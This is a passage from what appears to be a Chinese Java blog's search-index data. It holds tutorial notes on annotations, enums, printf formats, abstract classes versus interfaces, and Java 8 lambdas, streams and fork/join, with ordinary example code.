where annotations apply to types used in\n * declarations and expressions.\n *\n * <p>The constants {@link #ANNOTATION_TYPE} , {@link #CONSTRUCTOR} , {@link\n * #FIELD} , {@link #LOCAL_VARIABLE} , {@link #METHOD} , {@link #PACKAGE} ,\n * {@link #PARAMETER} , {@link #TYPE} , and {@link #TYPE_PARAMETER} correspond\n * to the declaration contexts in JLS 9.6.4.1.\n *\n * <p>For example, an annotation whose type is meta-annotated with\n * {@code @Target(ElementType.FIELD)} may only be written as a modifier for a\n * field declaration.\n *\n * <p>The constant {@link #TYPE_USE} corresponds to the 15 type contexts in JLS\n * 4.11, as well as to two declaration contexts: type declarations (including\n * annotation type declarations) and type parameter declarations.\n *\n * <p>For example, an annotation whose type is meta-annotated with\n * {@code @Target(ElementType.TYPE_USE)} may be written on the type of a field\n * (or within the type of the field, if it is a nested, parameterized, or array\n * type), and may also appear as a modifier for, say, a class declaration.\n *\n * <p>The {@code TYPE_USE} constant includes type declarations and type\n * parameter declarations as a convenience for designers of type checkers which\n * give semantics to annotation types. For example, if the annotation type\n * {@code NonNull} is meta-annotated with\n * {@code @Target(ElementType.TYPE_USE)}, then {@code @NonNull}\n * {@code class C {...}} could be treated by a type checker as indicating that\n * all variables of class {@code C} are non-null, while still allowing\n * variables of other classes to be non-null or not non-null based on whether\n * {@code @NonNull} appears at the variable's declaration.\n *\n * @author  Joshua Bloch\n * @since 1.5\n * @jls 9.6.4.1 @Target\n * @jls 4.1 The Kinds of Types and Values\n */\npublic enum ElementType {\n    /** Class, interface (including annotation type), or enum declaration */\n    TYPE,\n\n    /** Field declaration (includes enum constants) */\n    FIELD,\n\n    /** Method declaration */\n    METHOD,\n\n    /** Formal parameter declaration */\n    PARAMETER,\n\n    /** Constructor declaration */\n    CONSTRUCTOR,\n\n    /** Local variable declaration */\n    LOCAL_VARIABLE,\n\n    /** Annotation type declaration */\n    ANNOTATION_TYPE,\n\n    /** Package declaration */\n    PACKAGE,\n\n    /**\n     * Type parameter declaration\n     *\n     * @since 1.8\n     */\n    TYPE_PARAMETER,\n\n    /**\n     * Use of a type\n     *\n     * @since 1.8\n     */\n    TYPE_USE\n}\n```\n\n\n\n## @Documented\n\n> @Documented：注解表明这个注解应该被 javadoc工具记录。\n>\n> 默认情况下，javadoc是不包括注解的。但如果声明注解时指定了 @Documented，则它会被 javadoc 之类的工具处理，所以注解类型信息也会被包括在生成的文档中。是一个标记注解，没有成员。\n\n","tags":["Java"],"categories":["后端","Java"]},{"title":"Java枚举类型7种常见的用法","url":"/20250619/5296b9c2.html","content":"\n\n\n参考：[Java 枚举(enum) 详解7种常见的用法](http://blog.csdn.net/qq_27093465/article/details/52180865)\n\nJDK1.5引入了枚举类型\n\n## 用法一：常量\n\n在JDK1.5 之前，我们定义常量都是： public static fianl.... 。现在好了，有了枚举，可以把相关的常量分组到一个枚举类型里，而且枚举提供了比常量更多的方法。 \n\n```java\npublic enum Color {  \n\t  RED, GREEN, BLANK, YELLOW  \n} \n```\n\n## 用法二：switch\n\nJDK1.6之前的switch语句只支持int,char,enum类型，使用枚举，能让我们的代码可读性更强。 \n\n```java\nenum Signal {  \n    GREEN, YELLOW, RED  \n}  \npublic class TrafficLight {  \n    Signal color = Signal.RED;  \n    public void change() {  \n        switch (color) {  \n        case RED:  \n            color = Signal.GREEN;  \n            break;  \n        case YELLOW:  \n            color = Signal.RED;  \n            break;  \n        case GREEN:  \n            color = Signal.YELLOW;  \n            break;  \n        }  \n    }  \n} \n```\n\n## 用法三：向枚举中添加新方法\n\n如果打算自定义自己的方法，那么必须在enum实例序列的最后添加一个分号。而且 Java 要求必须先定义 enum 实例。 \n\n```java\npublic enum Color {  \n    RED(\"红色\", 1), GREEN(\"绿色\", 2), BLANK(\"白色\", 3), YELLO(\"黄色\", 4);  \n    // 成员变量  \n    private String name;  \n    private int index;  \n    // 构造方法  \n    private Color(String name, int index) {  \n        this.name = name;  \n        this.index = index;  \n\t}  \n\t// 普通方法  \n\tpublic static String getName(int index) {  \n\t\tfor (Color c : Color.values()) {  \n\t\t\tif (c.getIndex() == index) {  \n\t\t\t\treturn c.name;  \n\t\t\t}  \n\t\t}  \n\t\treturn null;  \n\t}  \n\t// get set 方法  \n\tpublic String getName() {  \n\t\treturn name;  \n\t}  \n\tpublic void setName(String name) {  \n\t\tthis.name = name;  \n\t}  \n\tpublic int getIndex() {  \n\t\treturn index;  \n\t}  \n\tpublic void setIndex(int index) {  \n\t\tthis.index = index;  \n\t}  \n}  \n```\n\n\n\n## 用法四：覆盖枚举的方法\n\n下面给出一个toString()方法覆盖的例子。 \n\n```java\npublic enum Color {  \n    RED(\"红色\", 1), GREEN(\"绿色\", 2), BLANK(\"白色\", 3), YELLO(\"黄色\", 4);  \n    // 成员变量  \n    private String name;  \n    private int index;  \n    // 构造方法  \n    private Color(String name, int index) {  \n        this.name = name;  \n        this.index = index;  \n\t}  \n\t//覆盖方法  \n\t@Override  \n\tpublic String toString() {  \n\t\treturn this.index+\"_\"+this.name;  \n\t}  \n}  \n\n```\n\n## 用法五：实现接口\n\n所有的枚举都继承自java.lang.Enum类。\n\n由于Java 不支持多继承，所以枚举对象不能再继承其他类。 \n\n```java\npublic interface Behaviour {  \n    void print();  \n    String getInfo();  \n}  \n\npublic enum Color implements Behaviour{  \n    RED(\"红色\", 1), GREEN(\"绿色\", 2), BLANK(\"白色\", 3), YELLO(\"黄色\", 4);  \n    // 成员变量  \n    private String name;  \n    private int index;  \n\t// 构造方法  \n\tprivate Color(String name, int index) {  \n\t\tthis.name = name;  \n\t\tthis.index = index;  \n\t}  \n\t//接口方法  \n\t@Override  \n\tpublic String getInfo() {  \n\t\treturn this.name;  \n\t}  \n\t//接口方法  \n\t@Override  \n\tpublic void print() {  \n\t\tSystem.out.println(this.index+\":\"+this.name);  \n\t}  \n}  \n```\n\n## 用法六：使用接口组织枚举\n\n```java\npublic interface Food {  \n    enum Coffee implements Food{  \n        BLACK_COFFEE,DECAF_COFFEE,LATTE,CAPPUCCINO  \n    }  \n    enum Dessert implements Food{  \n        FRUIT, CAKE, GELATO  \n    }  \n} \n```\n\n## 用法七：关于枚举集合的使用\n\njava.util.EnumSet和java.util.EnumMap是两个枚举集合。EnumSet保证集合中的元素不重复；EnumMap中的 key是enum类型，而value则可以是任意类型。关于这个两个集合的使用就不在这里赘述，可以参考JDK文档。\n\n关于枚举的实现细节和原理请参考：\n\n参考资料：《Thinking In Java》第四版\n\nhttp://softbeta.iteye.com/blog/1185573\n","tags":["Java"],"categories":["后端","Java"]},{"title":"Java中printf的用法总结","url":"/20250619/c3539d05.html","content":"\n| 格式 | 说明         | 补充说明                                                     |\n| ---- | ------------ | ------------------------------------------------------------ |\n| %c   | 单个字符     |                                                              |\n| %d   | 十进制整数   | `%d`：按整型数据的实际长度输出<br/><br/>`%md`：m为指定的输出字段的宽度。如果数据的位数小于m，则左端补以空格，若大于m，则按实际位数输出<br/><br/>`%ld`：输出长整型数据 |\n| %f   | 十进制浮点数 | `%f`不指定宽度，整数部分全部输出，并输出6位小数<br/>`%m.nf`输出共占m列，其中有n位小数，如数值宽度小于m左端补空格<br/>`%-m.nf`输出共占n列，其中有n位小数，如数值宽度小于m右端补空格 |\n| %o   | 八进制数     | `%o、%#o`： “#”号会将八进制符号“0X”显示出来。大写“X”，则会显示大写英文字符 |\n| %s   | 字符串       | `%s`例如:printf(\"%s\", \"CHINA\") 输出\"CHINA\"字符串（不包括双引号）<br/><br/>`%ms`输出的字符串占m列，如字符串本身长度大于m，则突破获m的限制,将字符串全部输出。若串长小于m，则左补空格<br/><br/>`%-ms`如果串长小于m，则在m列范围内，字符串向左靠，右补空格<br/><br/>`%m.ns`输出占m列，但只取字符串中左端n个字符。这n个字符输出在m列的右侧，左补空格<br/><br/>`%-m.ns`其中m、n含义同上，n个字符输出在m列范围的左侧，右补空格。如果n>m，则自动取n值，即保证n个字符正常输出 |\n| %x   | 十六进制数   | `%x、%X、%#x、%#X`： “#”号会将十六进制符号“0X”显示出来。大写“X”，则会显示大写英文字符 |\n| %%   | 输出百分号%  |                                                              |\n|      |              |                                                              |\n\n","tags":["Java"],"categories":["后端","Java"]},{"title":"abstract class和interface的区别","url":"/20250619/f7c553a3.html","content":"\n|          | Abstract class                                               | Interface                                                    |\n| -------- | ------------------------------------------------------------ | ------------------------------------------------------------ |\n| 实例化   | 不能                                                         | 不能                                                         |\n| 类       | 一种继承关系，一个类只能使用一次继承关系。<br/>可以通过继承多个接口实现多重继承 | 一个类可以实现多个interface                                  |\n| 数据成员 | 可有自己的                                                   | 静态的不能被修改即必须是static final，一般不在此定义         |\n| 方法     | 可以私有的，非abstract方法，必须实现                         | 不可有私有的，默认是public abstract 类型                     |\n| 变量     | 可有私有的，默认是friendly 型，其值可以在子类中重新定义，也可以重新赋值 | 不可有私有的，默认是public static final 型，且必须给其初值，实现类中不能重新定义，不能改变其值。 |\n| 设计理念 | 表示的是“is-a”关系                                           | 表示的是“like-a”关系                                         |\n| 实现     | 需要继承，要用 extends                                       | 要用 implements                                              |\n\n​\t\t`abstract class `和 `interface`在Java语言中都是用来进行抽象类（本文中的抽象类并非从abstract class翻译而来，它表示的是一个抽象体，而abstract class为Java语言中用于定义抽象类的一种方法）定义的\n\n#  定义\n\n- 定义：abstract class\n\n​\t\t声明方法的存在而不去实现它的类被叫做抽象类（abstract class），它用于要创建一个体现某些基本行为的类，并为该类声明方法，但不能在该类中实现该类的情况。不能创建abstract 类的实例。然而可以创建一个变量，其类型是一个抽象类，并让它指向具体子类的一个实例。不能有抽象构造函数或抽象静态方法。\n\n​\t\tabstract 类的子类为它们父类中的所有抽象方法提供实现，否则它们也是抽象类。取而代之，在子类中实现该方法。知道其行为的其它类可以在类中实现这些方法。\n\n- 定义：interface\n\n​\t\t接口（interface）是抽象类的变体。在接口中，所有方法都是抽象的。多继承性可通过实现 这样的接口而获得。接口中的所有方法都是抽象的，没有一个有程序体。\n\n​\t\t接口只可以定义`static final`成员变量。接口的实现与子类相似，除了该实现类不能从接口定义中继承行为。当类实现特殊接口时，它定义（即将程序体给予）所有这种接口的方法。 然后，它可以在实现了该接口的类的任何对象上调用接口的方法。由于有抽象类，它允许使用接口名作为引用变量的类型。通常的动态联编将生效。引用可以转换到 接口类型或从接口类型转换，`instanceof `运算符可以用来决定某对象的类是否实现了接口。\n\n> 接口可以继承接口。抽象类可以实现(implements)接口，抽象类是可以继承实体类，但前提是实体类必须有明确的构造函数。\n>\n> 接口更关注“能实现什么功能”，而不管“怎么实现的”。\n\n#  相同点\n\nA. 两者都是抽象类，都不能实例化。\n\nB. interface实现类及abstrct class的子类都必须要实现已经声明的抽象方法。\n\n# 不同点\n\n- `interface`需要实现，要用`implements`，而`abstract class`需要继承，要用`extends`。\n\n- 一个类可以实现多个`interfac`e，但一个类只能继承一个`abstract class`。\n\n- `interface`强调特定功能的实现，而`abstract class`强调所属关系\n\n- 尽管interface实现类及`abstrct class`的子类都必须要实现相应的抽象方法，但实现的形式不同。\n\n    `interface`中的每一个方法都是抽象方法，都只是声明的 (declaration, 没有方法体)，实现类必须要实现。\n\n    `abstract class`的子类可以有选择地实现。 这个选择有两点含义：\n\n    1.  `abastract class`中并非所有的方法都是抽象的。**只有那些冠有`abstract`的方法才是抽象的，子类必须实现**。那些没有`abstract`的方法，在`abstrct class`中必须定义方法体。\n    2.  `abstract class`的子类在继承它时，对非抽象方法既可以直接继承，也可以覆盖；而对抽象方法，可以选择实现，也可以通过再次声明其方法为抽象的方式，无需实现，留给其子类来实现，但此类必须也声明为抽象类。既是抽象类，当然也不能实例化。\n\n- `abstract class`是`interface`与`class`中介\n\n    ​\t\t`interface`是完全抽象的，只能声明方法，而且只能声明pulic的方法，不能声明`private`及`protected`的方法，不能定义方法体，也不能声明实例变量。然而，`interface`却可以声明常量变量，并且在JDK中不难找出这种例子。但将常量变量放在`interface`中违背了其作为接 口的作用而存在的宗旨，也混淆了`interface`与类的不同价值。如果的确需要，可以将其放在相应的`abstract class`或`class`中。\n    ​\t\t`abstract class`在`interface`及`class`中起到了承上启下的作用。一方面，`abstract class`是抽象的，可以声明抽象方法，以规范子类必须实现的功能；另一方面，它又可以定义缺省的方法体，供子类直接使用或覆盖。另外，它还可以定义自己 的实例变量，以供子类通过继承来使用。\n\n#   应用场合\n\n- `interface`\n\n    1. 类与类之前需要特定的接口进行协调，而不在乎其如何实现。\n    2. 作为能够实现特定功能的标识存在，也可以是什么接口方法都没有的纯粹标识。\n    3. 需要将一组类视为单一的类，而调用者只通过接口来与这组类发生联系。\n    4. 需要实现特定的多项功能，而这些功能之间可能完全没有任何联系。\n\n- `abstract class`\n    ==在既需要统一的接口，又需要实例变量或缺省的方法的情况下，就可以使用它==\n\n    最常见的有：\n\n    1. 定义了一组接口，但又不想强迫每个实现类都必须实现所有的接口。可以用`abstract class`定义一组方法体，甚至可以是空方法体，然后由子类选择自己所感兴趣的方法来覆盖。\n    2. 某些场合下，只靠纯粹的接口不能满足类与类之间的协调，还必需类中表示状态的变量来区别不同的关系。`abstract`的中介作用可以很好地满足这一点。\n    3. 规范了一组相互协调的方法，其中一些方法是共同的，与状态无关的，可以共享的，无需子类分别实现；而另一些方法却需要各个子类根据自己特定的状态来实现特定的功能。\n\n","tags":["Java"],"categories":["后端","Java"]},{"title":"Java 8 in Action【汪文君】","url":"/20250619/725f0c76.html","content":"\n源码： [Java8 In Action](https://github.com/java8/Java8InAction)\n笔记来源：[https://waltyou.github.io](https://waltyou.github.io) \n\n# 全书脑图\n\n![ Java 8 in Action](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/Java8-In-Action-16376831319681.png)\n\n \n\n<!--more-->\n\n# 梳理脉络\n\n通过脑图可以看出，全书分为四个部分：\n\n1. 基础知识，重点是为何关心java8，行为参数化和lambda\n\n2. 函数式编程，重点是全面系统的介绍Stream\n\n3. Java8的其他改善点\n\n   +  重构/测试/调试\n   +  默认方法（Default Function）\n   +  Optional替代null\n   +  CompletableFuture 组合式异步编程\n   +  日期时间API\n\n4. Java8之上：对函数式编程的思考，函数编程的技巧，与Scala的比较\n\n# 行为参数化\n\n1. Why\n   应对不断变化的需求，避免啰嗦，而且不打破DRY（Don’t Repeat Yourself）规则。\n2. What\n   简单讲：把方法（你的代码）作为参数传递给另一个方法。\n   复杂讲： 让方法接受多种行为（或战略）作为参数，并在内部使用，来完成不同的行为。\n3. How\n   Example：用一个Comparator排序Apple，使用Java 8中List默认的sort方法。\n\n```java\n// java.util.Comparator\npublic interface Comparator<T> {\n    public int compare(T o1, T o2);\n}\n// 匿名类写法\ninventory.sort(new Comparator<Apple>() {\n    public int compare(Apple a1, Apple a2){\n        return a1.getWeight().compareTo(a2.getWeight());\n    }\n});\n// lambda写法\ninventory.sort(\n    (Apple a1, Apple a2) ->\n    a1.getWeight().compareTo(a2.getWeight()));\n```\n\n# 匿名函数lambda\n\n使用lambda之前，需要了解两个概念：**函数式接口 **和**函数描述符**\n\n## 1. 函数式接口\n\n定义：只定义一个抽象方法的接口\n`@FunctionalInterface`：标注用于表示该接口会设计成一个函数式接口。\nJava 8 提供了一些新的函数式接口， 位置：java.util.function\n\n\n![image-20220502170433104](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20220502170433104.png) \n\n##  2. 函数描述符\n\n函数式接口的抽象方法的签名基本上就是Lambda表达式的签名。如下：\n\n```java\n() -> void\n(Apple) -> int\n(Apple, Apple) -> boolean\n```\n\n## 3. 实现细节\n\n### 类型检查\n\n 上下文中Lambda表达式需要的类型称为目标类型\n\n1. 同样的Lambda，不同的函数式接口\n2. 特殊的void兼容规则：如果一个Lambda的主体是一个语句表达式 它就和一个返回void的函数描述符兼容。\n\n### 类型推断\n\n编译器可以了解Lambda表达式的参数类型，这样就可以在Lambda语法中省去标注参数类型。\n\n### 使用局部变量\n\n```java\nint portNumber = 1337; \nRunnable r = () -> System.out.println(portNumber); \n```\n\n注意： Lambda可以没有限制地捕获（也就是在其主体中引用）实例变量和静态变量。但局部变量必须显式声明为final，或事实上是final。\n\n原因： \n1）局部变量保存在栈上，并且隐式表示它们仅限于其所在线程，如果允许捕获可改变的局部变量，就会引发造成线程不安全新的可能性；\n 2）不鼓励你使用改变外部变量的典型命令式编程模式\n\n### 方法引用（method reference）\n\n目标引用放在分隔符` :: `前, 方法的名称放在后面。\n\n```java\ninventory.sort(comparing(Apple::getWeight));\n```\n\n方法引用主要有三类:\n\n+ 指向静态方法的方法引用: Integer::parseInt\n+ 指向任意类型实例方法的方法引用: String::length\n+ 指向现有对象的实例方法的方法引用: expensiveTransaction::getValue\n\n```java\n//改写\nFunction<String, Integer> stringToInteger = (String s) -> Integer.parseInt(s);\nFunction<String, Integer> stringToInteger = Integer::parseInt;\n\nBiPredicate<List<String>, String> contains = (list, element) -> list.contains(element);\nBiPredicate<List<String>, String> contains = List::contains;\n```\n\n### 复合Lambda表达式 (因为引入了默认方法)\n\n#### 1. 比较器复合\n\n``` java\nComparator<Apple> c = Comparator.comparing(Apple::getWeight);\n// 逆序\ninventory.sort(comparing(Apple::getWeight).reversed());\n// 比较器链\ninventory.sort(comparing(Apple::getWeight)\n    .reversed()\n    .thenComparing(Apple::getCountry))\n```\n\n#### 2. 谓词复合 `negate`、`and`和`or`\n\n```java\n//取非\nPredicate<Apple> notRedApple = redApple.negate();\n//and操作\nPredicate<Apple> redAndHeavyApple = redApple.and(a -> a.getWeight() > 150);\n//and + or操作\nPredicate<Apple> redAndHeavyAppleOrGreen = redApple.and(a -> a.getWeight() > 150).or(a -> \"green\".equals(a.getColor()));\n```\n\n从左向右确定优先级.\n\n#### 3. 函数复合\n\nFunction提供了`andThen()`, `compose()`\n\n```java\nFunction<Integer, Integer> f = x -> x + 1; \nFunction<Integer, Integer> g = x -> x * 2; \n// expect: (2 + 1) * 2 = 4\n// f(g(x))\nSystem.out.println(f.andThen(g).apply(1));\n// expect: 1 * 2 + 1 = 3\n// g(f(x))\nSystem.out.println(f.compose(g).apply(1));\n```\n\n复合Lambda表达式可以用来创建各种转型流水线。\n\n\n\n# Stream定义\n\n从（支持数据处理操作的源）生成的（元素序列）\n\n元素序列：流提供了一个接口,可以访问特定元素类型的一组有序值。\n源：集合、数组或输入/输出资源\n数据处理操作：filter 、 map 、 reduce 、 find 、 match 、 sort等，可顺序，可并行。\n两个重要特点：\n\n+ 流水线：多个操作可以链接起来\n+ 内部迭代：流的迭代操作是在背后进行的，优点：透明地并行处理;优化处理顺序\n  注意：链中的方法调用都在排队等待,直到调用 collect 。\n\n\n# Stream操作\n\n## 概念\n\n两大类操作\n    1. 中间操作：会返回另一个流，map，filter等\n    2. 终端操作：从流的流水线生成结果，collect，foreach， count等\n使用三要素\n    + 一个数据源(如集合)来执行一个查询;\n    + 一个中间操作链,形成一条流的流水线;\n    + 一个终端操作,执行流水线,并能生成结果。\n\n```Java\ndishes.stream()\n    .filter(d -> d.getCalories() < 400)\n    .sorted(comparing(Dish::getCalories))\n    .map(Dish::getName)\n    .collect(toList());\n```\n\n## 常用函数\n\n1. 筛选和切片 Filtering and slicing\n   `filter()`，`distinct()`，`limit(n)`, `skip(n)`\n\n2. 映射 Mapping\n   + map: 对流中每一个元素应用函数\n   + flatmap: 把一个流中的每个值都换成另一个流,然后把所有的流连接起来成为一个流。\n\n3. 查找和匹配 Finding and matching\n   + anyMatch: 流中是否有一个元素能匹配给定的谓词, 方法返回一个 boolean\n   + allMatch: 流中的元素是否都能匹配给定的谓词, 方法返回一个 boolean\n   + noneMatch: 流中没有任何元素与给定的谓词匹配\n   + findAny: 返回当前流中的任意元素(Optional)\n   + findFirst: 找到第一个元素\n\n4. 归约 Reducing\n   将流中所有元素反复结合起来。\n\n   + 元素求和\n\n```java\nint sum = numbers.stream().reduce(0, Integer::sum);\nOptional<Integer> sum = numbers.stream().reduce(Integer::sum);\n```\n\n   + 最大值，最小值\n\n```java\nOptional<Integer> max = numbers.stream().reduce(Integer::max);\nOptional<Integer> min = numbers.stream().reduce(Integer::min);\n```\n\n5. 数值流 Numeric Streams\n   为了避免装箱带来的复杂性\n\n + 映射到数值流: mapToInt、mapToDouble 和 mapToLong\n + 转换回对象流\n\n```java\nIntStream intStream = menu.stream().mapToInt(Dish::getCalories);\nStream<Integer> stream = intStream.boxed();\n```\n\n+ 默认值 OptionalInt 、 OptionalDouble 和 OptionalLong\n+ 数值范围 IntStream.rangeClosed(1, 100)\n\n6. 构建流 Building streams\n\n   1. 由值创建流：\n\n   ```java\n    Stream<String> stream = Stream.of(\"Java 8 \", \"Lambdas \", \"In \", \"Action\";\n    stream.map(String::toUpperCase).forEach(System.out::println);\n    //空流\n    Stream<String> emptyStream = Stream.empty();\n   ```\n\n       2. 由数组创建流\n\n     ```java\n   int[] numbers = {2, 3, 5, 7, 11, 13};\n   int sum = Arrays.stream(numbers).sum();\n     ```\n\n       3. 由文件生成流\n\n     ```java\n   long uniqueWords = Files.lines(Paths.get(\"data.txt\"), Charset.defaultCharset())\n   .flatMap(line -> Arrays.stream(line.split(\" \")))\n   .distinct().count();\n     ```\n\n   4. 由函数生成流:创建无限流\n\n     ``` java \n    // iterate\n   Stream.iterate(0, n -> n + 2)\n   .limit(10)\n   .forEach(System.out::println);\n   // generate\n   Stream.generate(Math::random)\n   .limit(5)\n   .forEach(System.out::println);\n     ```\n\n# 用stream收集数据\n\n## 常用的收集器\n\n### Collectors.reducing：广义的归约汇总\n\n需要三个参数：\n\n+ 归约操作的起始值\n+ 获取或操作对象的属性数值(转换函数)\n+ BinaryOperator，如加法\n\n举例：\n\n```java\nint totalCalories = menu.stream().collect(reducing(\n    0,                      // 归约操作的起始值\n    Dish::getCalories,      // 获取或操作对象的属性数值(转换函数)\n    (i, j) -> i + j));      // BinaryOperator，如加法\n```\n\n### Collectors.groupingBy ：分组\n\n+ 一级分组\n\n```java\nMap<Dish.Type, List<Dish>> dishesByType = menu.stream().collect(groupingBy(Dish::getType));\n\n// 自定义分组\npublic enum CaloricLevel { DIET, NORMAL, FAT }\nMap<CaloricLevel, List<Dish>> dishesByCaloricLevel = menu.stream()\n                .collect(groupingBy(dish -> {\n                    if (dish.getCalories() <= 400)\n                        return CaloricLevel.DIET;\n                    else if (dish.getCalories() <= 700)\n                        return CaloricLevel.NORMAL;\n                    else\n                        return CaloricLevel.FAT;\n                }));\n```\n\n+ 多级分组\n\n```java\nmenu.stream().collect(groupingBy(Dish::getType,\n            groupingBy((Dish dish) -> {\n                if (dish.getCalories() <= 400) \n                    return CaloricLevel.DIET;\n                else if (dish.getCalories() <= 700) \n                    return CaloricLevel.NORMAL;\n                else \n                    return CaloricLevel.FAT;\n            } )\n        );\n```\n\n+ 与 groupingBy 联合使用的其他收集器\n  有时候在groupBy的时候，我们还想做一下其他操作，比如设定返回类型，或者只取对象中的某个属性。\n\n``` java\n// summingInt\nMap<Dish.Type, Integer> totalCaloriesByType = menu.stream()\n.collect(groupingBy(Dish::getType, summingInt(Dish::getCalories)));\n\n// mapping\nmenu.stream().collect(groupingBy(Dish::getType, mapping(dish -> {\n        if (dish.getCalories() <= 400)\n            return CaloricLevel.DIET;\n        else if (dish.getCalories() <= 700)\n            return CaloricLevel.NORMAL;\n        else\n            return CaloricLevel.FAT;\n    }, toSet())));\n\n//按子组收集数据\nMap<Dish.Type, Long> typesCount = menu.stream().collect(\n    groupingBy(Dish::getType, counting()));\n\n//Collectors.collectingAndThen： 把收集器返回的结果转换为另一种类型\nMap<Dish.Type, Dish> mostCaloricByType = menu.stream()\n.collect(groupingBy(Dish::getType, \n    collectingAndThen(maxBy(comparingInt(Dish::getCalories)), Optional::get)));\n```\n\n### Collectors.counting()\n\n### Collectors.maxBy\n\n### Collectors.minBy\n\n### Collectors.summingInt，Collectors.summingLong，Collectors.summingDouble\n\n### Collectors.averagingInt，Collectors.averagingLong，Collectors.averagingDouble\n\n### Collectors.summarizingInt\n\n### Collectors.joining\n\n\n### Collectors.partitioningBy 分区\n\n好处：保留了分区函数返回 true 或 false 的两套流元素列表。\n与groupby的区别：需要一个谓词（返回一个布尔值的函数）\n\n```java\nMap<Boolean, List<Dish>> partitionedMenu = menu.stream().collect(partitioningBy(Dish::isVegetarian));\n//二级分区\nmenu.stream().collect(partitioningBy(Dish::isVegetarian, partitioningBy (d -> d.getCalories() > 500)));\n//联合其他收集器\nmenu.stream().collect(partitioningBy(Dish::isVegetarian, counting()));\n```\n\n## Collector 接口\n\n### 基本定义：\n\n```java\npublic interface Collector<T, A, R> {\n    Supplier<A> supplier();\n    BiConsumer<A, T> accumulator();\n    Function<A, R> finisher();\n    BinaryOperator<A> combiner();\n    Set<Characteristics> characteristics();\n}\n```\n\n+ T 是流中要收集的项目的泛型\n+ A 是累加器的类型,累加器是在收集过程中用于累积部分结果的对象。\n+ R 是收集操作得到的对象(通常但并不一定是集合)的类型。\n\n方法分析：\n\n+ 建立新的结果容器: supplier 方法\n+ 将元素添加到结果容器: accumulator 方法\n+ 对结果容器应用最终转换: finisher 方法\n+ 合并两个结果容器: combiner 方法（并行归约）\n+ characteristics 方法：返回一个不可变的 Characteristics 集合\n  1.  UNORDERED：归约结果不受流中项目的遍历和累积顺序的影响\n  2.  CONCURRENT：accumulator函数可以从多个线程同时调用,且该收集器可以并行归约流。如果收集器没有标为UNORDERED,那它仅在用于无序数据源时才可以并行归约\n  3.  IDENTITY_FINISH：表明完成器方法返回的函数是一个恒等函数\n\n## 自定义收集器\n\n必要时，可以根据自己需求实现收集器， 来避免一些不必要的操作（如装箱拆箱），这样子可以获取更好的性能。\n\n测试用例如下：\n\n```java\n @Test\n    public void testOwnCollector() {\n\n        class ToListCollector<T> implements Collector<T, List<T>, List<T>> {\n            @Override\n            public Supplier<List<T>> supplier() {\n                log(\"supplier\");\n                return ArrayList::new;\n            }\n\n            @Override\n            public BiConsumer<List<T>, T> accumulator() {\n                log(\"accumulator\");\n                return List::add;\n            }\n\n            @Override\n            public BinaryOperator<List<T>> combiner() {\n                log(\"combiner\");\n                return (l1, l2) -> {\n                    l1.addAll(l2);\n                    return l1;\n                };\n            }\n\n            @Override\n            public Function<List<T>, List<T>> finisher() {\n                return Function.identity();\n            }\n\n            @Override\n            public Set<Characteristics> characteristics() {\n                log(\"characteristics\");\n                return Collections.unmodifiableSet(EnumSet.of(Characteristics.IDENTITY_FINISH, Characteristics.CONCURRENT));\n            }\n\n\n            private void log(final String log) {\n                System.out.println(Thread.currentThread().getName() + \"-\" + log);\n            }\n        }\n\n        Collector<String, List<String>, List<String>> collector = new ToListCollector<>();\n        String[] arr = new String[]{\"e1\", \"2r\", \"c\", \"s\"};\n        Optional.of(Arrays.stream(arr).filter(e -> e.matches(\"[a-z]\")).collect(collector))\n                .ifPresent(e -> {\n                    System.out.println(e.getClass());\n                    System.out.println(JSONObject.toJSONString(e));\n                });\n    }\n```\n\n# 并行数据处理与性能\n\n## 1. 并行流处理数据\n\njava 8 中提供了现成的并行处理流，即`parallelStream`。\n\n### 并行流与顺序流的转换\n\n对顺序流调用parallel方法，对并行流调用sequential方法。在合适的时候顺序流与并行流相互转换，可以提高效率。\n\n```java\nstream.parallel()\n    .filter(...)\n    .sequential()\n    .map(...)\n    .parallel()\n    .reduce();\n```\n\n注意点：\n\n+ 保证在内核中并行执行工作的时间比在内核之间传输数据的时间长。\n+ 避免改变了某些共享状态\n\n### 配置并行流使用的线程池\n\n并行流内部使用了默认的 ForkJoinPool， 它默认的线程数量就是你的处理器数量, 这个值是由`Runtime.getRuntime().availableProcessors()` 得到的。\n\n可以通过系统属性java.util.concurrent.ForkJoinPool.common.parallelism 来改变线程池大小：\n\n```java\nSystem.setProperty(\"java.util.concurrent.ForkJoinPool.common.parallelism\",\"12\");\n```\n\n### 如何高效使用：\n\n+ 测量\n+ 留意装箱\n+ 依赖于元素顺序的操作，本身在并行流上的性能就比顺序流差\n+ 流的操作流水线的总计算成本\n+ 数据少\n+ 数据结构是否易于分解\n+ 流自身的特点，以及流水线中的中间操作修改流的方式，都可能会改变分解过程的性能\n+ 终端操作中合并步骤的代价是大是小\n\n## 2. 分支/合并框架(The fork/join framework)\n\n### 目的\n\n以递归方式将可以并行的任务拆分成更小的任务，然后将每个子任务的结果合并起来生成整体结果。（先拆，并行处理，合并结果）\n\n### 定义\n\n`RecursiveTask`是ExecutorService接口的一个实现，它把子任务分配给线程池（称为ForkJoinPool）中的工作线程。\n\n### 使用\n\n实现`compute()`方法，提交至ForkJoinPool.invoke\n实际例子：\n\n```java\nimport java.util.concurrent.ForkJoinPool;\nimport java.util.concurrent.ForkJoinTask;\nimport java.util.concurrent.RecursiveTask;\nimport java.util.stream.LongStream;\n\npublic class ForkJoinSumCalculator extends RecursiveTask<Long> {\n\n    // 拆分任务的标准大小\n    public static final long THRESHOLD = 10_000;\n\n    private final long[] numbers;\n    private final int start;\n    private final int end;\n\n    public ForkJoinSumCalculator(long[] numbers) {\n        this(numbers, 0, numbers.length);\n    }\n\n    private ForkJoinSumCalculator(long[] numbers, int start, int end) {\n        this.numbers = numbers;\n        this.start = start;\n        this.end = end;\n    }\n\n    // 实现compute方法\n    @Override\n    protected Long compute() {\n        int length = end - start; // 获取当前剩余任务的大小\n        if (length <= THRESHOLD) {\n            return computeSequentially();\n        }\n        // 创建另外一个子任务 leftTask\n        ForkJoinSumCalculator leftTask = new ForkJoinSumCalculator(numbers, start, start + length/2);\n        // 异步执行 leftTask\n        leftTask.fork();\n        // 创建剩余一半任务的子任务 rightTask\n        ForkJoinSumCalculator rightTask = new ForkJoinSumCalculator(numbers, start + length/2, end);\n        // 递归调用获取结果\n        Long rightResult = rightTask.compute();\n        // 获取 leftTask 结果\n        Long leftResult = leftTask.join();\n        return leftResult + rightResult;\n    }\n\n    private long 